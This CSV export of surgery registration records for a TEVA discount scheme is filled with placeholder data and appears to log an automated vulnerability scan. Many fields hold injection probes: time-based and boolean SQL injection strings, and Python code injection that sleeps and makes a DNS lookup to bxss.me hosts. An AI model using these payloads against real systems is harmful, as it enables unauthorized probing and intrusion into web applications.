Unique ID,Surgery Name,Surgery Address 1,Surgery Address 2,Surgery Town,Surgery County,Surgery Post Code,Surgery Email,Surgery Telephone,TEVA Account No,TEVA Manager,Total Patients,Total Patients (Dispensing),Wholesaler Name,Wholesale Account,Wholesale Depot,Discount Axsain 45g,Discount Braltus Zonda 10mcg,Discount DuoResp Spiromax 160mcg/4.5mcg,Discount DuoResp Spiromax 320mcg/9mcg,Discount Qvar MDI 50mcg,Discount Qvar MDI 100mcg,Discount Qvar Easi-Breathe 50mcg,Discount Qvar Easi-Breathe 100mcg,Discount Zacin 45g,Authorised Signatory,Marketing Consent,Terms Agreement,Date Created,Activated,Date Activated,Sending bank details,
622e57ac-4ddc-4af5-ace4-10e78d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,0&quot;XOR(if(now()=sysdate();sleep(15);0))XOR&quot;Z,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e57ac-718c-48e8-814f-10e98d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))),1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e57ad-ab84-4acb-9698-10e28d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,No,2022-03-13,No,,Yes,
622e57aa-8f88-4477-96a7-10e28d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e57aa-4338-4884-bfc2-10e78d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,No,2022-03-13,No,,Yes,
622e57ab-f644-4142-9b76-10e98d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))),OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e57aa-993c-4f8c-94c4-32738d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,0&#039;XOR(if(now()=sysdate();sleep(15);0))XOR&#039;Z,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e57a8-65a0-4912-948a-10e98d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,No,2022-03-13,No,,Yes,
622e57a8-2d28-486a-959c-32738d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e57a8-dd58-47b9-a42b-10e28d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,if(now()=sysdate();sleep(15);0),4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e57a8-173c-427b-bfb1-10e78d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))),4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e57a7-7f88-43fa-9592-3dd48d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,&quot;+str(__import__(&#039;time&#039;).sleep(9))+__import__(&#039;socket&#039;).gethostbyname(&#039;hitcfgtzcyzev2e1f6.&#039;+&#039;bxss.me&#039;)+&quot;,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e57a6-24dc-418e-9ee0-10e78d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e57a6-52f8-49ce-b612-32738d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,-1&quot; OR 2+658-658-1=0+0+0+1 -- ,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e57a7-1758-497a-b135-10e28d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e57a5-56d0-40dd-bf36-3dd48d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,&#039;+str(__import__(&quot;time&quot;).sleep(9))+__import__(&quot;socket&quot;).gethostbyname(&quot;hitcfgtzcyzev2e1f6.&quot;+&quot;bxss.me&quot;)+&#039;,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e57a6-769c-4466-9113-10e98d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,No,2022-03-13,No,,Yes,
622e57a4-6cc4-42e8-9515-10e28d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,No,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e57a4-c654-4cba-86c8-10e78d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,-1&#039; OR 2+236-236-1=0+0+0+1 or &#039;I6jlkoEj&#039;=&#039;,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e57a3-9ddc-4ceb-b75e-3dd48d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,str(__import__(&#039;time&#039;).sleep(9))+__import__(&#039;socket&#039;).gethostbyname(&#039;hitcfgtzcyzev2e1f6.&#039;+&#039;bxss.me&#039;),NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e57a4-e340-4882-a425-10e98d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,No,2022-03-13,No,,Yes,
622e57a2-94c4-40e1-a2b8-10e28d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,No,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e57a2-cf18-4e71-b66e-10e78d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,-1&#039; OR 2+166-166-1=0+0+0+1 -- ,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e57a1-61f0-4896-ae24-3dd48d00a510,OdHqQRkU,3137 Laguna Street,&quot;+str(__import__(&#039;time&#039;).sleep(9))+__import__(&#039;socket&#039;).gethostbyname(&#039;hitogsrlochjv0216a.&#039;+&#039;bxss.me&#039;)+&quot;,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e57a1-c640-41b5-975b-32738d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))),94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e57a2-5bc0-4f0f-8ff6-10e98d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,No,2022-03-13,No,,Yes,
622e57a0-0a90-4ade-a6e6-10e28d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,No,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e57a0-30e4-4fb7-a6b0-10e78d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,-1 OR 2+408-408-1=0+0+0+1,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e579f-5688-4753-8702-3dd48d00a510,OdHqQRkU,3137 Laguna Street,&#039;+str(__import__(&quot;time&quot;).sleep(9))+__import__(&quot;socket&quot;).gethostbyname(&quot;hitogsrlochjv0216a.&quot;+&quot;bxss.me&quot;)+&#039;,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e579f-4934-42a0-9b7b-10e98d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))),NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e57a0-f110-4408-836e-32738d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,No,2022-03-13,No,,Yes,
622e579e-e600-47fd-9e59-10e78d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,No,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e579e-7270-4794-aee5-10e28d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,-1 OR 2+718-718-1=0+0+0+1 -- ,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e579d-6848-4f85-833c-3dd48d00a510,OdHqQRkU,3137 Laguna Street,str(__import__(&#039;time&#039;).sleep(9))+__import__(&#039;socket&#039;).gethostbyname(&#039;hitogsrlochjv0216a.&#039;+&#039;bxss.me&#039;),San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e579d-8b14-4d54-94e4-32738d00a510,OdHqQRkU,3137 Laguna Street,))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))),San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e579d-b9c0-496f-9d8a-10e98d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,No,Yes,2022-03-13,No,,Yes,
622e579c-9960-48fc-92b7-10e78d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,wWLpcNoQ,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e579c-d2b4-40aa-912e-10e28d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,No,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e579b-03b8-44eb-8f37-3dd48d00a510,OdHqQRkU,&quot;+str(__import__(&#039;time&#039;).sleep(9))+__import__(&#039;socket&#039;).gethostbyname(&#039;hitydnmfqmgmd8f2cd.&#039;+&#039;bxss.me&#039;)+&quot;,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e579b-efc0-40dd-a629-10e98d00a510,OdHqQRkU,))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))),3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e579b-3a4c-42e7-a3f2-32738d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,No,Yes,2022-03-13,No,,Yes,
622e579a-7398-4b5d-9f34-10e78d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,No,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5799-f59c-4e52-a0e7-32738d00a510,OdHqQRkU,&#039;+str(__import__(&quot;time&quot;).sleep(9))+__import__(&quot;socket&quot;).gethostbyname(&quot;hitydnmfqmgmd8f2cd.&quot;+&quot;bxss.me&quot;)+&#039;,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5799-bb3c-44fc-8bdc-3dd48d00a510,))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))),3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5799-d104-490b-89bf-10e98d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,No,Yes,2022-03-13,No,,Yes,
622e579a-4254-4147-81e1-10e28d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5797-63dc-4af7-9b38-10e98d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5797-d2d0-4fd8-ad0f-3dd48d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,No,Yes,2022-03-13,No,,Yes,
622e5798-2f74-4fd6-b320-10e78d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5798-8d5c-42a8-9136-10e28d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,No,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5797-eb04-45a6-93ec-32738d00a510,OdHqQRkU,str(__import__(&#039;time&#039;).sleep(9))+__import__(&#039;socket&#039;).gethostbyname(&#039;hitydnmfqmgmd8f2cd.&#039;+&#039;bxss.me&#039;),3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5795-6470-4b3c-b6e1-3dd48d00a510,&quot;+str(__import__(&#039;time&#039;).sleep(9))+__import__(&#039;socket&#039;).gethostbyname(&#039;hitvbrsqgpvfsde2e1.&#039;+&#039;bxss.me&#039;)+&quot;,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5795-4c7c-491c-a76e-32738d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,No,Yes,2022-03-13,No,,Yes,
622e5795-64f8-451f-a1cb-10e98d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5796-9004-481a-a835-10e28d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,@@Uc0tZ,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5796-a58c-488b-a011-10e78d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,No,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5794-2414-4323-a9c9-10e28d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5794-dee4-406c-a77d-10e78d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,No,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5792-a2e4-4a9d-b256-10e98d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,No,Yes,Yes,2022-03-13,No,,Yes,
622e5793-a91c-41ec-88ca-32738d00a510,&#039;+str(__import__(&quot;time&quot;).sleep(9))+__import__(&quot;socket&quot;).gethostbyname(&quot;hitvbrsqgpvfsde2e1.&quot;+&quot;bxss.me&quot;)+&#039;,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5793-ab08-46b2-bff0-3dd48d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,No,Yes,2022-03-13,No,,Yes,
622e5791-6da8-4e5e-96d7-10e78d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,No,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5791-2750-46fd-9385-10e28d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1&#039;&quot;,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5790-5b30-41ae-933f-3dd48d00a510,str(__import__(&#039;time&#039;).sleep(9))+__import__(&#039;socket&#039;).gethostbyname(&#039;hitvbrsqgpvfsde2e1.&#039;+&#039;bxss.me&#039;),3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5791-723c-4424-881b-32738d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,No,Yes,2022-03-13,No,,Yes,
622e5790-3860-4ecf-8597-10e28d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,No,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e578f-3c0c-4e8b-83d2-32738d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e578f-03d4-41cc-894d-3dd48d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,No,Yes,2022-03-13,No,,Yes,
622e578d-08f8-4ad0-9acc-32738d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,No,Yes,2022-03-13,No,,Yes,
